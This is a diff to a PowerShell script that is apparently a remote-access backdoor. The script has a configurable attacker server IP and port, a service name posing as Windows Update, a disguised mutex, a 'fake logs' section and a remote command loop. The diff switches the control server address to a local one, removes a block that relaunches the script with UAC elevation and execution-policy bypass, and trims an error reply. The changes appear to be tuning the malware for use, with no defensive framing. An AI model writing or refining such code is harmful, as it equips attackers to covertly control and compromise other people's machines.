@@ -8,7 +8,7 @@ Version: 10.0.19045.1
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
+$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
@@ -128,13 +128,6 @@ if (Test-Path $userListFile) {
 
 if (-not $userExecuted) {
     Add-UserToList $currentUser
-}
-
-# ===== ELEVAR PRIVILEGIOS =====
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    Start-Process powershell -Verb RunAs -ArgumentList $arguments
-    exit
 }
 
 # ===== LOGS FAKES =====
@@ -781,7 +774,7 @@ while ($true) {
                 # ===== SAIR =====
                 "exit" { break }
                 
-                default { $writer.WriteLine("Comando nao reconhecido: $cmd") }
+                default { $writer.WriteLine("Comando nao reconhecido") }
             }
         }
     } catch {
